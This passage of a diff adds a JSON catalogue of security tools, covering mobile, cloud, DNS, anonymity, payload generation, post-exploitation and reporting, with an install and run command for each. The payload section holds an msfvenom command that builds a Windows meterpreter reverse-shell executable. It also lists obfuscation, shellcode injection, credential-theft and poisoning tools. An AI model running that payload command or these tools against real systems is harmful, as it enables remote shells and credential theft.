+      "full_title": "Mobile Application Security",
+      "icon": "📱",
+      "tools": [
+        {
+          "title": "Frida",
+          "description": "Dynamic instrumentation for mobile",
+          "install": ["pip install frida"],
+          "run": ["frida -p 1234"],
+          "url": "https://frida.re/",
+          "tags": ["mobile", "dynamic-analysis"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Burp Suite Mobile",
+          "description": "Mobile app proxy",
+          "install": ["https://portswigger.net/burp"],
+          "run": ["burpsuite"],
+          "url": "https://portswigger.net/burp",
+          "tags": ["mobile", "proxy"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "APKTool",
+          "description": "Android APK decompiler",
+          "install": ["apt-get install apktool"],
+          "run": ["apktool d application.apk"],
+          "url": "https://ibotpeaches.github.io/Apktool/",
+          "tags": ["mobile", "android"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "jadx",
+          "description": "Android DEX decompiler",
+          "install": ["apt-get install jadx"],
+          "run": ["jadx application.apk"],
+          "url": "https://github.com/skylot/jadx",
+          "tags": ["mobile", "android"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "cloud_security",
+      "title": "Cloud & Container Security",
+      "full_title": "Cloud Platform & Container Security",
+      "icon": "☁️",
+      "tools": [
+        {
+          "title": "CloudMapper",
+          "description": "AWS network mapper",
+          "install": ["git clone https://github.com/duo-labs/cloudmapper && cd cloudmapper && pip install -r requirements.txt"],
+          "run": ["python cloudmapper.py"],
+          "url": "https://github.com/duo-labs/cloudmapper",
+          "tags": ["cloud", "aws"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Scout2",
+          "description": "AWS security auditor",
+          "install": ["pip install scout2"],
+          "run": ["scout2"],
+          "url": "https://github.com/nccgroup/scout2",
+          "tags": ["cloud", "aws", "audit"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Prowler",
+          "description": "AWS security checks",
+          "install": ["git clone https://github.com/prowler-cloud/prowler && cd prowler && ./install.sh"],
+          "run": ["./prowler aws"],
+          "url": "https://github.com/prowler-cloud/prowler",
+          "tags": ["cloud", "aws", "audit"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Falco",
+          "description": "Container runtime security",
+          "install": ["apt-get install falco"],
+          "run": ["sudo falco"],
+          "url": "https://falco.org/",
+          "tags": ["container", "runtime-security"],
+          "os": ["linux"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "dnstools",
+      "title": "DNS Tools",
+      "full_title": "Domain Name System Analysis",
+      "icon": "🌍",
+      "tools": [
+        {
+          "title": "DNSRecon",
+          "description": "DNS reconnaissance",
+          "install": ["git clone https://github.com/darkoperator/dnsrecon.git && pip install -r requirements.txt"],
+          "run": ["python dnsrecon.py -d example.com"],
+          "url": "https://github.com/darkoperator/dnsrecon",
+          "tags": ["dns", "reconnaissance"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Dig",
+          "description": "Domain information groper",
+          "install": ["apt-get install dnsutils"],
+          "run": ["dig example.com"],
+          "url": "https://linux.die.net/man/1/dig",
+          "tags": ["dns", "lookup"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Nslookup",
+          "description": "DNS query tool",
+          "install": ["apt-get install dnsutils"],
+          "run": ["nslookup example.com"],
+          "url": "https://linux.die.net/man/1/nslookup",
+          "tags": ["dns", "lookup"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "anonymity",
+      "title": "Anonymity & Privacy",
+      "full_title": "Anonymity, Proxies & VPN",
+      "icon": "👤",
+      "tools": [
+        {
+          "title": "Tor Browser",
+          "description": "Anonymized web browser",
+          "install": ["apt-get install torbrowser-launcher"],
+          "run": ["torbrowser-launcher"],
+          "url": "https://www.torproject.org/",
+          "tags": ["anonymity", "privacy"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Proxychains",
+          "description": "Route apps through proxy",
+          "install": ["apt-get install proxychains"],
+          "run": ["proxychains curl http://example.com"],
+          "url": "https://github.com/haad/proxychains",
+          "tags": ["proxy", "anonymity"],
+          "os": ["linux"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "OpenVPN",
+          "description": "VPN client/server",
+          "install": ["apt-get install openvpn"],
+          "run": ["sudo openvpn config.ovpn"],
+          "url": "https://openvpn.net/",
+          "tags": ["vpn", "privacy"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Wireguard",
+          "description": "Modern VPN protocol",
+          "install": ["apt-get install wireguard"],
+          "run": ["sudo wg-quick up wg0"],
+          "url": "https://www.wireguard.com/",
+          "tags": ["vpn", "privacy"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "payload_generation",
+      "title": "Payload Generation",
+      "full_title": "Payload & Shellcode Generation",
+      "icon": "🚀",
+      "tools": [
+        {
+          "title": "msfvenom",
+          "description": "Metasploit payload generator",
+          "install": ["apt-get install metasploit-framework"],
+          "run": ["msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > shell.exe"],
+          "url": "https://www.metasploit.com/",
+          "tags": ["payload", "shellcode"],
+          "os": ["linux", "macos"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Veil",
+          "description": "Payload obfuscation framework",
+          "install": ["git clone https://github.com/Veil-Framework/Veil.git && cd Veil && ./setup/setup.sh -i"],
+          "run": ["./Veil.py"],
+          "url": "https://github.com/Veil-Framework/Veil",
+          "tags": ["payload", "obfuscation"],
+          "os": ["linux"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Shellter",
+          "description": "Dynamic shellcode injection",
+          "install": ["https://www.shellterproject.com/"],
+          "run": ["shellter.exe"],
+          "url": "https://www.shellterproject.com/",
+          "tags": ["payload", "injection"],
+          "os": ["windows"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "post_exploitation",
+      "title": "Post-Exploitation",
+      "full_title": "Post-Exploitation & Persistence",
+      "icon": "⚔️",
+      "tools": [
+        {
+          "title": "Mimikatz",
+          "description": "Windows credential extraction",
+          "install": ["https://github.com/gentilkiwi/mimikatz/releases"],
+          "run": ["mimikatz.exe"],
+          "url": "https://github.com/gentilkiwi/mimikatz",
+          "tags": ["post-exploitation", "windows"],
+          "os": ["windows"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "PowerShell Empire",
+          "description": "Post-exploitation framework",
+          "install": ["git clone https://github.com/PowerShellEmpire/Empire.git"],
+          "run": ["python empire"],
+          "url": "https://github.com/PowerShellEmpire/Empire",
+          "tags": ["post-exploitation", "framework"],
+          "os": ["linux", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        },
+        {
+          "title": "Responder",
+          "description": "LLMNR/NBT-NS poisoning",
+          "install": ["git clone https://github.com/lgandx/Responder.git"],
+          "run": ["sudo python Responder.py -I eth0"],
+          "url": "https://github.com/lgandx/Responder",
+          "tags": ["post-exploitation", "network"],
+          "os": ["linux"],
+          "requires_root": true,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    },
+    {
+      "id": "reporting",
+      "title": "Reporting & Documentation",
+      "full_title": "Penetration Test Reporting",
+      "icon": "📊",
+      "tools": [
+        {
+          "title": "PlexTrac",
+          "description": "Penetration test reporting platform",
+          "install": ["https://plextrac.com/"],
+          "run": ["web-based"],
+          "url": "https://plextrac.com/",
+          "tags": ["reporting", "documentation"],
+          "os": ["web"],
+          "requires_root": false,
+          "installable": false,
+          "runnable": true
+        },
+        {
+          "title": "Faraday",
+          "description": "Integrated penetration testing IDE",
+          "install": ["pip install faraday-client"],
+          "run": ["faraday-client"],
+          "url": "https://www.faradaysec.com/",
+          "tags": ["reporting", "ide"],
+          "os": ["linux", "macos", "windows"],
+          "requires_root": false,
+          "installable": true,
+          "runnable": true
+        }
+      ]
+    }
+  ]
+}
